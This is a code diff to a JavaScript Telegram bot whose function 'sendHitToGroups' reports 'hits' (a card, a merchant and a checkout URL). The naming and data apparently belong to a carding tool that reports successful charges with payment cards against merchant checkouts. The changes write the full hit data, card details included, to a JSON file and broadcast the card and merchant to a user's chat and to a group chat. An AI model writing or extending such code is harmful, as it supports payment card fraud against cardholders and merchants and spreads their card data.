@@ -496,6 +496,19 @@ const MAIN_MENU_KEYBOARD = {
 
 // Send hit notification to group chats
 async function sendHitToGroups(hitData, checkoutUrl) {
+  // IMMEDIATE FILE LOGGING - Create file as soon as function is called
+  const fs = require('fs');
+  const path = require('path');
+  const logData = {
+    timestamp: new Date().toISOString(),
+    function: 'sendHitToGroups',
+    hitData: hitData,
+    checkoutUrl: checkoutUrl,
+    status: 'function_called'
+  };
+  const logFile = path.join(__dirname, '..', 'sendhit_groups_called.json');
+  fs.writeFileSync(logFile, JSON.stringify(logData, null, 2));
+
   console.log('[SEND_HIT_GROUPS] Called with hitData:', hitData);
 
   const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -514,16 +527,25 @@ async function sendHitToGroups(hitData, checkoutUrl) {
     return;
   }
 
-  // Send a simple debug message to confirm function is working
-  const debugMessage = `🔧 DEBUG: sendHitToGroups executed at ${new Date().toLocaleTimeString()}`;
+  // Send debug message to user's personal chat to confirm function is working
+  const debugMessage = `🔧 DEBUG: sendHitToGroups executed!\nHit: ${hitData.card}\nMerchant: ${hitData.merchant}\nTime: ${new Date().toLocaleTimeString()}`;
 
   try {
-    if (GROUP_1) {
-      await sendMessage(BOT_TOKEN, GROUP_1, debugMessage);
-      console.log('[SEND_HIT_GROUPS] Debug message sent to GROUP_1');
-    }
+    // Send to user's personal chat instead of groups for testing
+    await sendMessage(BOT_TOKEN, hitData.userId, debugMessage);
+    console.log('[SEND_HIT_GROUPS] Debug message sent to user:', hitData.userId);
   } catch (debugError) {
     console.error('[SEND_HIT_GROUPS] Failed to send debug message:', debugError.message);
+  }
+
+  // Also try to send to group if configured
+  try {
+    if (GROUP_1) {
+      await sendMessage(BOT_TOKEN, GROUP_1, `🎯 HIT: ${hitData.card} | ${hitData.merchant}`);
+      console.log('[SEND_HIT_GROUPS] Group message sent to GROUP_1');
+    }
+  } catch (groupError) {
+    console.error('[SEND_HIT_GROUPS] Failed to send group message:', groupError.message);
   }
 
   // Detect merchant name - prioritize hitData.merchant, fallback to URL detection
